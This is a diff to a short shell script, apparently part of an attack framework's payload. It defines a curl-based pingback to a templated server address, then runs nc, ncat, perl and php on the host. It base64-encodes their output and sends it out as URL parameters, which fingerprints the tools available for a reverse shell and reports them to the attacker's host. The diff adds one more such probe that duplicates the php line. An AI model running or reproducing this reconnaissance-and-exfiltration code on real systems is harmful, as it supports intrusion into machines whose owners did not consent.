@@ -1,5 +1,6 @@
 #!/bin/sh
 
+
 pingback() {
     if command -v curl > /dev/null 2>&1; then
         curl "{{datastore.srvhost_url}}$1" -o /dev/null
@@ -25,3 +26,5 @@ pingback "debug/tools/nc/?value=$(nc -h 2>&1 | base64 | tr -d \\n | sed -e 's/+/
 pingback "debug/tools/ncat/?value=$(ncat -h 2>&1 | base64 | tr -d \\n | sed -e 's/+/%2B/g' -e 's#/#%2F#g')"
 pingback "debug/tools/perl/?value=$(perl --version 2>&1 | base64 | tr -d \\n | sed -e 's/+/%2B/g' -e 's#/#%2F#g')"
 pingback "debug/tools/php/?value=$(php --version 2>&1 | base64 | tr -d \\n | sed -e 's/+/%2B/g' -e 's#/#%2F#g')"
+
+pingback "debug/tools/newest/?value=$(php --version 2>&1 | base64 | tr -d \\n | sed -e 's/+/%2B/g' -e 's#/#%2F#g')"
